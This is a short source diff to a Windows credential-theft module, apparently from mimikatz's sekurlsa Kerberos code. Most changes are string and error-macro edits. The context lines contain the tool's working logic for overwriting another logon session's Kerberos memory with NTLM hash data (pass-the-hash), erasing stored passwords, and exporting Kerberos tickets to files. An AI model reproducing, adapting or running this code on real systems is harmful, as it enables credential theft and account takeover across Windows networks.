@@ -343,7 +343,7 @@ const KERB_INFOS kerbHelper[] = {
 	},
 };
 
-KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = {L"kerberos", kuhl_m_sekurlsa_enum_logon_callback_kerberos, TRUE, L"kerberos.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
+KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_package = {"kerberos", kuhl_m_sekurlsa_enum_logon_callback_kerberos, TRUE, "kerberos.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
 const PKUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_kerberos_single_package[] = {&kuhl_m_sekurlsa_kerberos_package};
 
 NTSTATUS kuhl_m_sekurlsa_kerberos(int argc, wchar_t * argv[])
@@ -546,7 +546,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 
 								if(pthData->isReplaceOk = kull_m_memory_copy(&RemoteLocalKerbSession, &aLocalNTLMMemory, offset))
 									kprintf(L"%s", resultok);
-								else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+								else PRINT_ERROR_AUTO_C("kull_m_memory_copy");
 							}
 
 							if(pthData->isReplaceOk)
@@ -556,7 +556,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_kerberos_callback_pth(IN PKIWI_BASIC_SECURITY
 								{
 									if(pthData->isReplaceOk = kull_m_memory_copy(&aRemotePasswdMemory, &aLocalPasswdMemory, kerbHelper[KerbOffsetIndex].passwordEraseSize))
 										kprintf(L"null");
-									else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
+									else PRINT_ERROR_AUTO_C("kull_m_memory_copy");
 									LocalFree(aLocalPasswdMemory.address);
 								}
 							}
@@ -658,7 +658,7 @@ void kuhl_m_sekurlsa_kerberos_enum_tickets(IN PKIWI_BASIC_SECURITY_LOGON_SESSION
 								{
 									if(kull_m_file_writeData(filename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
 										kprintf(L"\n\t   * Saved to file %s !", filename);
-									else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
+									else PRINT_ERROR_AUTO_C("kull_m_file_writeData");
 									ber_bvfree(BerApp_KrbCred);
 								}
 								LocalFree(filename);
@@ -685,7 +685,7 @@ wchar_t * kuhl_m_sekurlsa_kerberos_generateFileName(PLUID LogonId, const DWORD g
 	if(buffer = (wchar_t *) LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
 	{
 		if(isLong)
-			isLong = swprintf_s(buffer, charCount, L"[%x;%x]-%1u-%u-%08x-%wZ@%wZ-%wZ.%s", LogonId->HighPart, LogonId->LowPart, grp, index, ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
+			isLong = swprintf_s(buffer, charCount, L"[%x;%x]-%1u-%u-%08x-%wZ@[%wZ]-%wZ.%s", LogonId->HighPart, LogonId->LowPart, grp, index, ticket->TicketFlags, &ticket->ClientName->Names[0], &ticket->ServiceName->Names[0], &ticket->ServiceName->Names[1], ext) > 0;
 		else
 			isLong = swprintf_s(buffer, charCount, L"[%x;%x]-%1u-%u-%08x.%s", LogonId->HighPart, LogonId->LowPart, grp, index, ticket->TicketFlags, ext) > 0;
 		
